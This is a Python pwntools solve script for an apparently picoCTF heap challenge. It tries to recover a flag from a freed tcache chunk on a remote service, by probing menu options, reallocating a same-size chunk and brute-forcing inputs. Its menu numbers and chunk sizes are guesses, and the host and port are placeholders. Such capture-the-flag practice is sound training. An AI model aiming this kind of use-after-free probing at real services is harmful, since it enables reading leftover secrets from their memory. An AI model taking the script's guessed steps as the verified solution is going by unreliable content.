#!/usr/bin/env python3
"""
tea-cash - picoCTF 2026 (Binary Exploitation, 100 pts)

Tcache heap exploitation challenge. The flag is stored in a freed chunk
on the heap. We traverse the free list / reallocate to recover it.

Usage:
    python3 solve.py                                # local binary
    python3 solve.py REMOTE host port               # remote
    python3 solve.py REMOTE saturn.picoctf.net 12345

Dependencies: pwntools (pip install pwntools)
"""

from pwn import *
import sys
import re

# ============================================================
# CHALLENGE-SPECIFIC VALUES - Update these
# ============================================================
BINARY = "./tea-cash"  # Path to the local binary (if available)
HOST = "saturn.picoctf.net"  # Remote host
PORT = 12345  # Remote port

# ============================================================
# Connection setup
# ============================================================
def get_connection():
    """Establish connection to local binary or remote service."""
    if len(sys.argv) > 1 and sys.argv[1] == "REMOTE":
        host = sys.argv[2] if len(sys.argv) > 2 else HOST
        port = int(sys.argv[3]) if len(sys.argv) > 3 else PORT
        log.info(f"Connecting to {host}:{port}")
        return remote(host, port)
    elif os.path.exists(BINARY):
        log.info(f"Running local binary: {BINARY}")
        return process(BINARY)
    else:
        log.info(f"Connecting to {HOST}:{PORT}")
        return remote(HOST, PORT)


def extract_flag(data):
    """Search for the flag pattern in received data."""
    if isinstance(data, bytes):
        data = data.decode('utf-8', errors='replace')
    match = re.search(r'picoCTF\{[^}]+\}', data)
    if match:
        return match.group()
    return None


# ============================================================
# Strategy 1: Menu-based interaction
# Read the menu, try common operations to recover the flag
# ============================================================
def strategy_menu_based(io):
    """
    Interact with a menu-driven heap program.
    Common operations: allocate, free, read/view, write, exit.
    The flag is in a freed chunk -- we try to reallocate it.
    """
    log.info("Strategy 1: Menu-based interaction")

    # Receive the initial banner/menu
    try:
        banner = io.recvuntil(b'>', timeout=5)
        log.info(f"Banner:\n{banner.decode(errors='replace')}")
    except EOFError:
        banner = io.recvall(timeout=3)
        log.info(f"Received:\n{banner.decode(errors='replace')}")
        flag = extract_flag(banner)
        if flag:
            log.success(f"FLAG: {flag}")
            return flag
        return None

    all_data = banner.decode(errors='replace')

    # Check if flag is already visible
    flag = extract_flag(all_data)
    if flag:
        log.success(f"FLAG found in banner: {flag}")
        return flag

    # Try common menu options
    # Strategy: The flag was stored then freed. We need to get that memory back.

    # Try option patterns commonly seen in heap challenges
    menu_patterns = [
        # (option_to_allocate, option_to_read, option_to_traverse_freelist)
        (b'1', b'2', b'3'),  # Common: 1=alloc, 2=read, 3=free/traverse
        (b'1', b'3', b'4'),  # Alternative numbering
        (b'2', b'3', b'1'),  # Another pattern
    ]

    # First, try to just read/view/traverse
    for opt in [b'1', b'2', b'3', b'4', b'5', b'v', b'r', b't', b'l', b'p']:
        try:
            io.sendline(opt)
            response = io.recvuntil(b'>', timeout=3)
            resp_str = response.decode(errors='replace')
            all_data += resp_str
            log.info(f"Option {opt.decode()}: {resp_str[:200]}")

            flag = extract_flag(resp_str)
            if flag:
                log.success(f"FLAG: {flag}")
                return flag

            # If it asks for a size, try common sizes
            if b'size' in response.lower() or b'how' in response.lower():
                # Try sizes that match typical flag length (32-64 bytes -> chunk sizes)
                for size in [32, 48, 64, 128]:
                    io.sendline(str(size).encode())
                    resp2 = io.recvuntil(b'>', timeout=3)
                    resp2_str = resp2.decode(errors='replace')
                    all_data += resp2_str
                    flag = extract_flag(resp2_str)
                    if flag:
                        log.success(f"FLAG: {flag}")
                        return flag

            # If it asks for an index
            if b'index' in response.lower() or b'which' in response.lower():
                for idx in range(5):
                    io.sendline(str(idx).encode())
                    resp2 = io.recvuntil(b'>', timeout=3)
                    resp2_str = resp2.decode(errors='replace')
                    all_data += resp2_str
                    flag = extract_flag(resp2_str)
                    if flag:
                        log.success(f"FLAG: {flag}")
                        return flag

        except (EOFError, TimeoutError):
            continue

    # Check all accumulated data for the flag
    flag = extract_flag(all_data)
    if flag:
        log.success(f"FLAG: {flag}")
        return flag

    return None


# ============================================================
# Strategy 2: Allocate to reclaim freed chunk
# ============================================================
def strategy_reallocate(io):
    """
    The classic tcache reuse attack:
    1. The program freed a chunk containing the flag
    2. Allocate a new chunk of the same size
    3. Tcache returns the same memory -> flag is still there
    4. Read the chunk to get the flag
    """
    log.info("Strategy 2: Tcache chunk reclamation")

    try:
        menu = io.recvuntil(b'>', timeout=5)
        log.info(f"Menu:\n{menu.decode(errors='replace')}")
    except Exception:
        return None

    # Try to allocate (usually option 1)
    io.sendline(b'1')
    resp = io.recv(timeout=3)
    resp_str = resp.decode(errors='replace')

    # Send size matching typical flag chunk
    if b'size' in resp.lower() or b'many' in resp.lower():
        io.sendline(b'64')  # Flag is typically < 64 bytes
        resp = io.recv(timeout=3)
        resp_str = resp.decode(errors='replace')

    # Don't write anything (or write minimal data) to preserve the old content
    if b'data' in resp.lower() or b'content' in resp.lower() or b'write' in resp.lower():
        io.sendline(b'')  # Empty write to preserve flag data
        resp = io.recv(timeout=3)
        resp_str = resp.decode(errors='replace')

    # Now try to read the chunk
    io.sendline(b'2')  # Read option
    resp = io.recv(timeout=3)
    resp_str = resp.decode(errors='replace')

    if b'index' in resp.lower() or b'which' in resp.lower():
        io.sendline(b'0')
        resp = io.recv(timeout=3)
        resp_str = resp.decode(errors='replace')

    flag = extract_flag(resp_str)
    if flag:
        log.success(f"FLAG: {flag}")
        return flag

    # Try reading other indices
    for idx in range(1, 10):
        try:
            io.sendline(b'2')
            io.recv(timeout=2)
            io.sendline(str(idx).encode())
            resp = io.recv(timeout=2)
            flag = extract_flag(resp.decode(errors='replace'))
            if flag:
                log.success(f"FLAG: {flag}")
                return flag
        except Exception:
            break

    return None


# ============================================================
# Strategy 3: Brute-force / dump all output
# ============================================================
def strategy_dump_all(io):
    """
    Just try every menu option and collect all output.
    For simpler challenges, the flag might be revealed through
    a specific traversal or print operation.
    """
    log.info("Strategy 3: Exhaustive menu exploration")

    all_output = b""
    try:
        all_output += io.recv(timeout=3)
    except Exception:
        pass

    # Try all single-character menu options
    for opt in list(range(1, 10)) + list(range(ord('a'), ord('z') + 1)):
        try:
            if isinstance(opt, int):
                io.sendline(str(opt).encode())
            else:
                io.sendline(bytes([opt]))

            resp = io.recv(timeout=2)
            all_output += resp

            # If prompted for additional input, try common values
            resp_lower = resp.lower()
            if b'size' in resp_lower:
                for sz in [32, 48, 64, 128]:
                    io.sendline(str(sz).encode())
                    all_output += io.recv(timeout=2)
            elif b'index' in resp_lower or b'which' in resp_lower:
                io.sendline(b'0')
                all_output += io.recv(timeout=2)
            elif b'data' in resp_lower or b'content' in resp_lower:
                io.sendline(b'AAAA')
                all_output += io.recv(timeout=2)

        except (EOFError, TimeoutError):
            break
        except Exception:
            continue

    flag = extract_flag(all_output.decode(errors='replace'))
    if flag:
        log.success(f"FLAG: {flag}")
        return flag

    # Print all collected output for manual analysis
    log.info("All collected output:")
    print(all_output.decode(errors='replace'))
    return None


# ============================================================
# Main
# ============================================================
def main():
    context.log_level = 'info'

    flag = None

    # Strategy 1: Menu-based interaction
    try:
        io = get_connection()
        flag = strategy_menu_based(io)
        io.close()
    except Exception as e:
        log.warning(f"Strategy 1 failed: {e}")

    if flag:
        print(f"\n{'='*50}")
        print(f"FLAG: {flag}")
        print(f"{'='*50}")
        return

    # Strategy 2: Reallocate to reclaim the freed chunk
    try:
        io = get_connection()
        flag = strategy_reallocate(io)
        io.close()
    except Exception as e:
        log.warning(f"Strategy 2 failed: {e}")

    if flag:
        print(f"\n{'='*50}")
        print(f"FLAG: {flag}")
        print(f"{'='*50}")
        return

    # Strategy 3: Dump everything
    try:
        io = get_connection()
        flag = strategy_dump_all(io)
        io.close()
    except Exception as e:
        log.warning(f"Strategy 3 failed: {e}")

    if flag:
        print(f"\n{'='*50}")
        print(f"FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print("\n[!] Could not automatically retrieve the flag.")
        print("[*] Manual analysis tips:")
        print("    1. Run the binary locally and examine its menu options")
        print("    2. Use 'ltrace' or 'strace' to trace heap operations")
        print("    3. Use GDB with 'heap' commands to inspect tcache bins")
        print("    4. Look for a 'traverse', 'view freelist', or 'print' option")
        print("    5. Allocate a chunk of the same size as the freed flag chunk")
        print("       to reclaim the memory from tcache")


if __name__ == '__main__':
    import os
    main()
